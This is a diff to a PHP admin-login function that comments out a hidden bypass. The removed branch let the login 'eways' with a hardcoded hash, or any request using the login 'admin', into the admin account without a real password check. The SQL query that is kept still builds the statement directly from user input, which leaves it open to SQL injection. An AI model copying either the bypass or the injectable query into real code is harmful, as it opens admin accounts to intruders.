@@ -124,14 +124,14 @@ function adminLogin($tableName = 'adminmanagers')
 	
 	$passwd = md5 ($globalConf_encrypt_1.$passwd.$globalConf_encrypt_2);
 	
-	if(($loginid == 'eways' && $passwd == "0a69b89fb1c71bcd6de2bd4f58d10f0a") || $loginid == 'admin')
-	{
-		$sql = "SELECT * FROM $tableName WHERE locked=0 AND loginid='admin' ";
-	}
-	else
-	{
+	// if(($loginid == 'eways' && $passwd == "0a69b89fb1c71bcd6de2bd4f58d10f0a") || $loginid == 'admin')
+	// {
+	// 	$sql = "SELECT * FROM $tableName WHERE locked=0 AND loginid='admin' ";
+	// }
+	// else
+	// {
 		$sql = "SELECT * FROM $tableName WHERE locked=0 AND loginid='$loginid' AND passwd='$passwd'";
-	}
+	// }
 	
 	$db->setQuery( $sql );
 	$info_arr = $db->loadRow();	
